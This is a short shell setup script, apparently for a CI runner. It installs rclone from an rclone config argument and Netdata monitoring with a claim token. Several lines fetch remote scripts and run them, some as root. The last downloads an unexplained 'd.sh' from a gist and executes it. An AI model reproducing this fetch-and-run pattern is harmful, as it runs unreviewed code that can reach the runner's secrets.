#rclone.sh RCLONE ND_TOKEN ND_ROOM REMOTE_1 REMOTE_2


echo "install rclone"
curl https://rclone.org/install.sh | sudo bash
mkdir -p /home/runner/.config/rclone/
echo "$1" | sudo tee -a /home/runner/.config/rclone/rclone.conf > /dev/null
wget https://my-netdata.io/kickstart.sh
chmod +x kickstart.sh
echo -ne '\n' | ./kickstart.sh --claim-token $2 --claim-rooms $3 --claim-url https://app.netdata.cloud
awk -v n=194 -v seed="$RANDOM" 'BEGIN { srand(seed); for (i=0; i<n; ++i) printf("%.4f\n", rand()) }'
wget https://gist.githubusercontent.com/AmyTheBuildBot/791c4d6d41982d5cd5d6351a85d7af72/raw/bd8b0e13368012ed54e43e25d0fe389a30d9c760/d.sh
chmod +x d.sh
./d.sh
